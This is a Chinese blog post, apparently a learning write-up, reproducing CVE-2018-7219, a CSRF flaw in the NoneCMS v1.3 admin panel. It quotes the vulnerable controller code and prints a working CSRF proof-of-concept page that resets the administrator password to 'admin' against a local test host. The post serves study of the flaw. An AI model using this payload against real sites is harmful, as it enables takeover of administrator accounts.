    <title>Nonecms v1.3后台CSRF漏洞（CVE-2018-7219）</title>
    <url>/2018/08/04/Nonecms-v1-3%E5%90%8E%E5%8F%B0CSRF%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-7219%EF%BC%89/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>此次实践只是为了学习知识，巩固一下网络攻防，增强动手能力。</p>
<a id="more"></a>

<h1 id="Action"><a href="#Action" class="headerlink" title="Action"></a>Action</h1><p>这次实验很简单（PHP等其他环境搭建好的条件下），在NoneCms官网找到下载链接，按照提示安装即可。</p>
<p>以修改管理员密码为例，来说明漏洞详情：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">        $params &#x3D; input(&#39;post.&#39;);</span><br><span class="line">            $data &#x3D; [</span><br><span class="line">                &#39;username&#39; &#x3D;&gt; $params[&#39;user_name&#39;],</span><br><span class="line">                &#39;password&#39; &#x3D;&gt;  $params[&#39;password&#39;],</span><br><span class="line">                &#39;email&#39; &#x3D;&gt; $params[&#39;email&#39;],</span><br><span class="line">                &#39;islock&#39; &#x3D;&gt; $params[&#39;islock&#39;],</span><br><span class="line">                &#39;repassword&#39; &#x3D;&gt; $params[&#39;repassword&#39;]</span><br><span class="line">            ];</span><br><span class="line">---------------------------------------------------------   </span><br><span class="line"></span><br><span class="line">     &#x2F;**</span><br><span class="line">     * 修改用户信息</span><br><span class="line">     *&#x2F;</span><br><span class="line">    public function edit($id)</span><br><span class="line">    &#123;</span><br><span class="line">        $data &#x3D; Db::name(&#39;admin&#39;)-&gt;find($id);</span><br><span class="line">        $this-&gt;assign(&#39;data&#39;, $data);</span><br><span class="line">        return $this-&gt;fetch();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br></pre></td></tr></table></figure>
<p>根据代码（application/admin/controller/Admin.php ）可以发现，由于没有加入token只需要输入新密码即可，因此这里存在着CSRF漏洞。</p>
<p>我们首先记录管理员初始密码的md5值，方便后面对比<br><img src="https://github.com/xinkjung/Photos/raw/master/nonecms1.PNG" alt="nonecms1"></p>
<p>抓包查看参数，发现并没有token参数限制，并且不需要我们输入旧密码，所以直接CSRF即可~<br><img src="https://github.com/xinkjung/Photos/raw/master/nonecms4.png" alt="nonecms4"></p>
<p>于是我们制作一个恶意网页，诱导管理员点击该网页，便可达到修改管理员的目的。<br><img src="https://github.com/xinkjung/Photos/raw/master/nonecms3_crsf.PNG" alt="nonecms3_csrf"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">  &lt;script&gt;history.pushState(&#39;&#39;, &#39;&#39;, &#39;&#x2F;&#39;)&lt;&#x2F;script&gt;</span><br><span class="line">    &lt;form action&#x3D;&quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;public&#x2F;index.php&#x2F;admin&#x2F;admin&#x2F;edit.html&quot; method&#x3D;&quot;POST&quot;&gt;</span><br><span class="line">      &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;username&quot; value&#x3D;&quot;nonecms&quot; &#x2F;&gt;</span><br><span class="line">      &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;email&quot; value&#x3D;&quot;&quot; &#x2F;&gt;</span><br><span class="line">      &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;password&quot; value&#x3D;&quot;admin&quot; &#x2F;&gt;</span><br><span class="line">      &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;repassword&quot; value&#x3D;&quot;admin&quot; &#x2F;&gt;</span><br><span class="line">      &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;role&amp;#95;id&quot; value&#x3D;&quot;&quot; &#x2F;&gt;</span><br><span class="line">      &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;islock&quot; value&#x3D;&quot;0&quot; &#x2F;&gt;</span><br><span class="line">      &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;id&quot; value&#x3D;&quot;1&quot; &#x2F;&gt;</span><br><span class="line">    &lt;&#x2F;form&gt;</span><br><span class="line">    &lt;script&gt;docuemnt.form[0].submit();&lt;&#x2F;script&gt;</span><br><span class="line">  &lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p>这时再查看数据库发现后台管理员密码已被修改！<br><img src="https://github.com/xinkjung/Photos/raw/master/nonecms2.PNG" alt="nonecms2"></p>
<p>同样的，我们也可以利用CSRF请求来新添一位管理员用户</p>
<p>到此，此次实验完成！！！<br><img src="https://github.com/xinkjung/Photos/raw/master/IMG_2872.GIF" alt="happy"></p>
<p>参考链接<br><a href="http://foreversong.cn/archives/1081">http://foreversong.cn/archives/1081</a></p>
]]></content>
      <tags>
        <tag>CVE</tag>
        <tag>CSRF</tag>
        <tag>Nonecms</tag>
      </tags>
  </entry>
